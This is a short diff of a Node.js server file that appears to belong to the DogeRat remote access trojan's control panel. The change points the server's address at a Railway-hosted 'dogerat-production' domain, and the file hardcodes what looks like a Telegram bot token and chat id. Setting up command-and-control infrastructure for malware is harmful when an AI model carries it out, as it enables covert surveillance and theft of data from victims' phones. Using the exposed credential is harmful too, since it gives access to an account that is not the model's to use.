@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '8586551981:AAHmdv-j6wEwae6hWjF4sMuIlWuO1lCKiFU'
 const id = '256156772'
-const address = 'https://www.google.com'
+const address = 'https://dogerat-production-147b.up.railway.app'
 
 const app = express();
 const appServer = http.createServer(app);
